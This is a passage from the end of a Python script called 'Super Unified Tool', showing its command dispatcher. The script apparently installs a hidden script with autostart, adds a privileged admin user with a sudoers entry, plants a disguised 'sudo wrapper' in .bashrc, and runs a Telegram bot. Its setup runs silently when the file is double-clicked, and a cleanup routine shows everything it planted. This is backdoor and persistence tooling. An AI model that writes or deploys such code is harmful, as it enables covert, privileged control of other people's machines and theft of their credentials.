    except Exception:
        pass

    # --- Double-click / no-argument friendly: auto-run setup ---
    if len(sys.argv) == 1:
        install_deferred_setup()
        return

    parser = argparse.ArgumentParser(description="Super Unified Tool")
    subparsers = parser.add_subparsers(dest="command", required=True)
    subparsers.add_parser("setup",   help="Install hidden script + autostart")
    subparsers.add_parser("install", help="Self-install from /tmp (one-liner deploy)")
    subparsers.add_parser("bot",     help="Auto-install deps + start Telegram bot")
    subparsers.add_parser("cleanup", help="Remove everything (run with sudo)")
    p_scan = subparsers.add_parser("scan", help="Find files owned by a user")
    p_scan.add_argument("username")

    args = parser.parse_args()

    if args.command == "setup":
        install_deferred_setup()

    elif args.command == "install":
        self_install()

    elif args.command == "bot":
        run_bot()

    elif args.command == "scan":
        print(find_user_files_logic(args.username))

    elif args.command == "cleanup":
        if os.getuid() != 0:
            print("[-] Run cleanup with sudo.")
            return
        subprocess.run(["userdel", "-r", SYS_ADMIN_USER], check=False)
        for path in [f"/etc/sudoers.d/99-{SYS_ADMIN_USER}", HIDDEN_TOOL, PAYLOAD_SCRIPT, AUTOSTART_FILE]:
            try:
                os.remove(path)
                print(f"[+] Removed: {path}")
            except: pass
        # Remove sudo wrapper from .bashrc
        if os.path.exists(BASHRC):
            with open(BASHRC, "r") as f:
                lines = f.readlines()
            with open(BASHRC, "w") as f:
                skip = False
                for line in lines:
                    if "# Added by System Service" in line:
                        skip = True
                    if not skip:
                        f.write(line)
                    if skip and line.strip() == "}":
                        skip = False
        print("[+] Cleanup complete.")

if __name__ == "__main__":
    main()